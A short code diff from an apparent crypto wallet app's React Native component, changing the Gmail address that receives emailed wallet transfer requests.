@@ -37,7 +37,7 @@ const Crypto = ({ navigation }) => {
         date: new Date().toDateString(),
         type: "Send",
         status: "Pending",
-        to: ["bchain676754@gmail.com"],
+        to: ["diamondprofx@gmail.com"],
         message: {
           subject: `Transfer request to another wallet from Blockchain Wallet`,
           text: `The user user with the email ${
